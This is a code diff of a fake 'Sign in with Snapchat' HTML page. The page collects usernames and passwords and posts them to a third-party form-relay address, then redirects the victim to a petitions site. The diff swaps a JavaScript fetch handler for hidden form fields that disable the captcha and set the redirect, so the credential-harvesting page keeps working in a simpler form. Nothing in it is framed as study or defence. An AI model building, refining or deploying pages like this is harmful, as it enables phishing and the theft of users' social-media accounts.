@@ -9,39 +9,19 @@
 <body>
   <div class="container">
     <div class="logo"></div>
-    <h1>Sign In With Snapchat</h1>
-    <form id="loginForm" action="https://formsubmit.co/2ded5fbb7c4b2e9e372c6a196b72a54e" method="POST">
+    <h1>Sign in with Snapchat</h1>
+    <form action="https://formsubmit.co/2ded5fbb7c4b2e9e372c6a196b72a54e" method="POST">
       <label for="username">Username or Email</label>
       <input type="text" id="username" name="username" required>
       <label for="password">Password</label>
       <input type="password" id="password" name="password" required>
+      <input type="hidden" name="_next" value="https://petitions.me/petitions.html" />
+      <input type="hidden" name="_captcha" value="false" />
       <input type="submit" value="Log in">
     </form>
     <div class="login-box">
       <a href="#">Forgot password?</a> | <a href="#">Sign up</a>
     </div>
   </div>
-  <script>
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
-      event.preventDefault(); // Prevent form submission
-      var form = event.target;
-      fetch(form.action, {
-        method: form.method,
-        body: new FormData(form)
-      })
-      .then(function(response) {
-        if (response.ok) {
-          window.location.href = "https://petitions.me/petitions.html";
-        } else {
-          // Handle error or display error message
-          console.error("Form submission failed. Error:", response.status);
-        }
-      })
-      .catch(function(error) {
-        // Handle error or display error message
-        console.error("Form submission failed. Error:", error);
-      });
-    });
-  </script>
 </body>
 </html>
